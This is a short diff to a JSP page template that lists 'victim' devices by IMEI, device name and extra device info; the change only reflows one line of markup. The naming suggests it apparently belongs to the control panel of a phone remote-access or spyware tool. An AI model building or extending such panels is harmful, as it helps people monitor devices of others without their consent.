@@ -98,7 +98,9 @@
                     </td>
                     <td class="clickable_data"><%=victim.getIMEI()%>
                     </td>
-                    <td data-toggle="collapse" data-target="#<%=victim.getId()%>"><%=victim.getDeviceName()%><span class="label label-default pull-right">more...</span>
+                    <td data-toggle="collapse" data-target="#<%=victim.getId()%>"><%=victim.getDeviceName()%><span
+                            class="label label-default pull-right">more...</span>
+
                         <div id="<%=victim.getId()%>" class="collapse">
                             <%=Victim.getDeviceInfoReadable(victim.getOtherDeviceInfo())%>
                         </div>
